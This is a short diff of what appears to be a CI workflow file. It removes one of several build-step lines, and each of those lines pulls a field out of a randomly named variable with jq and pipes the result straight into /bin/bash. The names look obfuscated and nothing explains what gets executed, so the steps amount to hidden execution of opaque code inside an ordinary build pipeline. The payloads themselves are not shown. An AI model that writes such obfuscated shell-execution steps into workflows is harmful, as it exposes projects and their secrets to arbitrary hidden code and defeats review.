@@ -27,7 +27,6 @@ jobs:
           echo $lzvns138 | jq -r .loc64 | /bin/bash
           printf '%s' "$h04075" | jq -r .fjrfe1 | /bin/bash
           printf '%s' "$tlbx400" | jq -r .hngah69 | /bin/bash
-          printf '%s' "$o03086" | jq -r .per799 | /bin/bash
           echo $jjvft003 | jq -r .i30308 | /bin/bash
 
       - name: Upload results
